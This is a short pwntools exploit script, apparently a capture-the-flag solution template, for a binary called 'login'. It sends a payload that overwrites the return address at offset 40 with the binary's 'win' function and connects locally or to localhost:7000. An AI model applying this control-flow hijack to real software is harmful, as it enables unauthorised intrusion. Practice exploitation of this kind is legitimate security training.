#!/usr/bin/env python3

from pwn import *

exe = ELF("login")


context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7000)
    elif args.GDB:
        return gdb.debug(exe.path)
    else:
        return process(exe.path)


def main():
    r = conn()

    payload = flat({
        40: exe.symbols['win'],
    })
    r.sendline(payload)
    r.sendline(b"")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()